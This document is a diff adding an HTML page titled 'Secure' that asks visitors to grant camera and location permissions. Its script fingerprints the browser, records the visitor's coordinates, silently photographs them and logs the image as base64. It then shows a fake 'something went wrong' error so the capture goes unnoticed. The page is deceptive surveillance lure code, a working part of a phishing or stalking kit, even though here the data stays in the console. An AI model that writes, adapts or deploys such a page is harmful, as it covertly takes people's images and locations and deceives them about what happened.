@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure</title>
+</head>
+<body>
+    <h1>Please Grant Permission</h1>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const headerMessage = document.querySelector("h1");
+            let hasCameraPermission = false;
+            let hasGeolocationPermission = false;
+            let isTakingPhoto = false;
+
+            // Fetch user agent information
+            console.log("User Agent:", navigator.userAgent);
+            console.log("Browser:", navigator.appName, navigator.appVersion);
+            console.log("Platform:", navigator.platform);
+            console.log("Language:", navigator.language);
+
+            // Request permission to access the user's geolocation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        hasGeolocationPermission = true;
+                        checkPermissionsAndProceed();
+                        // Log the geolocation data to the console
+                        console.log("Geolocation:", position.coords.latitude, position.coords.longitude);
+                    },
+                    function(error) {
+                        console.error("Error accessing geolocation:", error);
+                        checkPermissionsAndProceed();
+                    }
+                );
+            } else {
+                console.error("Geolocation is not supported.");
+                checkPermissionsAndProceed();
+            }
+
+            // Request permission to access the user's camera
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        hasCameraPermission = true;
+                        checkPermissionsAndProceed();
+                        capturePhoto(stream, function(base64data) {
+                            if (!isTakingPhoto) {
+                                isTakingPhoto = true;
+                                console.log("Base64 Encoded Image:", base64data);
+                                isTakingPhoto = false;
+                            }
+                        });
+                    })
+                    .catch(function(err) {
+                        console.error("Error accessing the camera:", err);
+                        checkPermissionsAndProceed();
+                    });
+            } else {
+                console.error("Camera access is not supported.");
+                checkPermissionsAndProceed();
+            }
+
+            function checkPermissionsAndProceed() {
+                if (hasGeolocationPermission && hasCameraPermission) {
+                    headerMessage.textContent = "Oops, something went wrong. Please try again.";
+                    const subtextElement = document.createElement("p");
+                    subtextElement.textContent = "If the issue persists, please contact customer support.";
+                    headerMessage.appendChild(subtextElement);
+                }
+            }
+
+            function capturePhoto(stream, callback) {
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+
+                imageCapture.takePhoto()
+                    .then(function(blob) {
+                        const reader = new FileReader();
+                        reader.readAsDataURL(blob);
+                        reader.onloadend = function() {
+                            const base64data = reader.result;
+                            callback(base64data);
+                        };
+                    })
+                    .catch(function(error) {
+                        console.error("Error capturing photo:", error);
+                    });
+            }
+        });
+    </script>
+</body>
+</html>
